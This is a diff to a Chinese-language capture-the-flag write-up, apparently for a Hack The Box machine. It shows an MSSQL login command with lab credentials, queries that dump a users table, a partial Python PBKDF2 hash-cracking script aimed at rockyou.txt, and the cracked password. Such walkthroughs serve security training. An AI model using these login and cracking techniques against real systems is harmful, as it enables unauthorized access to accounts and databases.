@@ -65,7 +65,7 @@ Host script results:
 ## 初始访问
 
 ### MSSQL 枚举
-#### 尝试 1：SQL 身份验证（访客访问）
+#### SQL 身份验证（访客访问）
 ```BASH
 impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
 ```
@@ -112,4 +112,33 @@ SELECT name FROM sys.tables;
 ```SQL
 SELECT * FROM users;
 ```
+ ![[Pasted image 20251116210210.png]]
  
+### 破解密码哈希
+
+创建了一个 Python 脚本来破解 Flask PBKDF2 哈希:
+
+```PYTHON
+#!/usr/bin/env python3
+import hashlib
+import gzip
+from multiprocessing import Pool, cpu_count
+
+def check_password(args):
+    password, salt, iterations, target_hash = args
+    try:
+        computed = hashlib.pbkdf2_hmac('sha256', password, salt.encode('utf-8'), iterations)
+        if computed.hex() == target_hash:
+            return password.decode('utf-8', errors='ignore')
+    except:
+        pass
+    return None
+
+# Hash components
+salt = "<REDACTED_SALT>"
+iterations = 600000
+target_hash = "<REDACTED_HASH>"
+
+# Run against rockyou.txt with multiprocessing
+```
+**破解密码:** iloveyou1
